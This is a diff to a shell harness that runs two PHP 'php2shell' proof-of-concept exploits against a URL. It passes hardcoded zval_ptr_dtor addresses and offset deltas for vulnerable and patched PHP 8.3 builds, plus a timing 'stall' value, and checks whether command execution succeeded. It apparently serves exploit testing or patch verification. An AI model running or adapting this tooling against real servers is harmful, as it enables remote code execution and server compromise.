@@ -10,14 +10,14 @@ VARIANT="$1"; URL="${2%/}/"
 #   patched    php:8.3.37 zval_ptr_dtor runtime = 0x555555ADD5D0
 #   delta (both builds) = 0xDBC0  -- see profile-deltas.tsv
 case "$VARIANT" in
-  vulnerable) DTOR=${DTOR_V:-0x555555ADD150} ;;
-  patched)    DTOR=${DTOR_P:-0x555555ADD5D0} ;;
-  *)          DTOR=${DTOR_V:-0} ;;
+  vulnerable) DTOR=${DTOR_V:-0x555555ADD150}; DELTA=${DELTA_V:-0xDBC0} ;;
+  patched)    DTOR=${DTOR_P:-0x555555ADD5D0}; DELTA=${DELTA_P:-0xDBC0} ;;
+  *)          DTOR=${DTOR_V:-0}; DELTA=${DELTA_V:-0xDBC0} ;;
 esac
 HIT=0
 for P in pocs/php2shell-618.py pocs/php2shell-619.py; do
   echo "--- $P"
-  OUT=$(python3 "$P" "$URL" --dtor "$DTOR" --delta 0xDBC0 2>&1); RC=$?
+  OUT=$(python3 "$P" "$URL" --dtor "$DTOR" --delta "$DELTA" --stall "${STALL:-1.35}" 2>&1); RC=$?
   echo "$OUT"
   [ "$RC" = 0 ] && echo "$OUT" | grep -q 'command_in_body True' && HIT=1
 done
